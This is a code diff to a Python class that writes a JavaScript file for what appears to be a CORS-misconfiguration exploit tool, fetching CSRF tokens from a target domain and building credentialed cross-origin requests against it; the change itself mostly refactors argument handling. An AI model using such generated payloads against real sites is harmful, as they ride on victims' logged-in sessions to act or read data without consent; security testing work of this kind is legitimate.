@@ -4,12 +4,13 @@ class writejs():
     def __init__(self, args, arg):
             self.cf = arg
             self.args = args
+            self.script = ''
             self.callcsrf = ''
-            if self.args.auth.lower() != 'y':
+            if self.args.auth:
                 self.cookie = '.withCredentials = true;'
             else:
                 self.cookie = '.withCredentials = false;'
-            if self.args.csrf.lower() == 'y':
+            if self.args.csrf:
                 def csrf(dom):
                     req = requests.get(dom)
                     try:
@@ -22,8 +23,7 @@ class writejs():
                     return token1,token2
                 self.content1,self.content2 = csrf(self.cf.domain)  
                 self.callcsrf= f"token('{self.cf.domain}' , '{self.content1}', '{self.content2}')"
-            with open ('CORS_Javascript/cors.js','w') as f:
-                f.write('''
+            self.script = ('''
         function token(site,reg1 ,reg2){
             var xhr_csrf = new XMLHttpRequest();
             xhr_csrf.onreadystatechange = function() { 
@@ -62,4 +62,6 @@ class writejs():
             else{'''f'''
                 sendreq('{self.cf.method.upper()}', '{self.args.site}','{self.cf.url}','','{self.cf.content}')
             ''''}')
+            with open ('CORS_Javascript/cors.js','w') as f:
+                f.write(self.script)
             
